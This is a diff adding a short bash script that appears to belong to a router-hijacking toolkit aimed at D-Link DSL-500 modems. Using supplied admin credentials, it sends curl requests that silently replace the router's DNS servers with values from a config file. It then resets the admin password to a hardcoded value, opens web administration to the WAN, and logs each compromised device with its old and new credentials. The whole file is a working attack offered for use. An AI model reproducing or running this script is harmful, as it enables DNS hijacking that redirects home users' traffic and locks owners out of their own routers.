@@ -1,0 +1,27 @@
+#!/bin/bash
+
+# by bonny
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+dns1F1=`echo $DNS1 | cut -d '.' -f1`
+dns1F2=`echo $DNS1 | cut -d '.' -f2`
+dns1F3=`echo $DNS1 | cut -d '.' -f3`
+dns1F4=`echo $DNS1 | cut -d '.' -f4`
+dns2F1=`echo $DNS2 | cut -d '.' -f1`
+dns2F2=`echo $DNS2 | cut -d '.' -f2`
+dns2F3=`echo $DNS2 | cut -d '.' -f3`
+dns2F4=`echo $DNS2 | cut -d '.' -f4`
+
+${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/Action?dns_status=1&Preferred+DNS+Server_1=$dns1F1&Preferred+DNS+Server_2=$dns1F2&Preferred+DNS+Server_3=$dns1F3&Preferred+DNS+Server_4=$dns1F4&Alternate+DNS+Server_1=$dns2F1&Alternate+DNS+Server_2=$dns2F2&Alternate+DNS+Server_3=$dns2F3&Alternate+DNS+Server_4=$dns2F4&id=59&cmdSubmit.x=17&cmdSubmit.y=16" 1>/dev/null 2>/dev/null
+
+${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/Action?user=admin&ex_param1=admin&new_pass1=$PASSWD&new_pass2=$PASSWD&id=3&cmdSubmit.x=22&cmdSubmit.y=12&http_port=80&http_wan=1" 1>/dev/null 2>/dev/null
+	
+echo "[+] modificado, http://$HOSTNAME $USERNAME:$PASSWORD [D-LINK DSL-500]"
+echo "http://$HOSTNAME ($USERNAME:$PASSWORD => $PASSWD) [D-LINK DSL-500]" >> logs/modificados.log
